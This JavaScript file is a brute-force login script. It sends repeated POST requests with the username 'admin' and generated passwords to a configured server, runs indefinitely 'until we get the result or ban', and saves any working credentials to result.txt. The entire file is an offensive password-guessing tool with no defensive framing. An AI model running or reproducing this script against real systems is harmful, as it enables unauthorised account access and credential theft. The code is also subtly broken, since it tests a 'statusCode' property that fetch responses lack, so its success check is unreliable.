import config from "./config.json" assert { type: "json" };
import helpers from "./helpers";

async function main({
  serverURI,
  attempts,
  chars,
  attemptTimeout = 0,
  maxPassLength,
}) {
  if (!attempts) return console.log("No attempts provided");

  const passGen = helpers.createPassGen(chars);
  // @todo add username generation
  let username = "admin";
  let password = "";

  if (attempts === true) {
    attempts = Infinity; // until we get the result or ban
  }

  try {
    for (let i = 0; i < attempts; i++) {
      await helpers.sleep(attemptTimeout);

      const response = await fetch(serverURI, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username,
          password,
        }),
      }).catch((err) => console.error(err));

      const SUCCESS_STATUS = 200;

      if (response.statusCode === SUCCESS_STATUS) {
        console.log("|> Success <|");
        helpers.writeResult(
          `username: ${username}; password: ${password}`,
          "result.txt"
        );
        break;
      } else {
        password = passGen();

        if (password.length >= maxPassLength) {
          console.log("Max pass length exceeded");
          break;
        }
      }
    }
  } catch (error) {
    console.error(error);
  }
}

main(config);
